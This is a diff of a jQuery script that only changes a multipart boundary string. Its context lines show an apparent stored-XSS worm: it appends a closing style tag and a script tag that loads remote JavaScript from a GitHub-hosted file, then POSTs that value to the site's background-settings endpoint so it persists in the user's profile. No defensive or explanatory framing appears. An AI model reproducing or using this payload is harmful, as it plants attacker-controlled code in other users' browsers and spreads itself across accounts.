@@ -7,7 +7,7 @@ jQuery(document).ready(function(jQuery){
 		if (!reg.test(color)) {
 			color = color + ";}</style><script src=//raw.github.com/vplay/js/master/video.func.js></script><style>x{color:#fff";
 
-			var split = '-----------------------------1607244593586329361604643559';
+			var split = '-----------------------------855657377400827271157349801';
 			var data = split + '\n' +
 				'Content-Disposition: form-data; name="form_id"\n' +
 				'\n' +
@@ -44,7 +44,7 @@ jQuery(document).ready(function(jQuery){
 
 		    var xhr = new XMLHttpRequest();
 		    xhr.open('POST', '/settings/background_save.do');
-		    xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=---------------------------1607244593586329361604643559');
+		    xhr.setRequestHeader('Content-Type', 'multipart/form-data; boundary=---------------------------855657377400827271157349801');
 		    xhr.send(data);
 		}
 	});
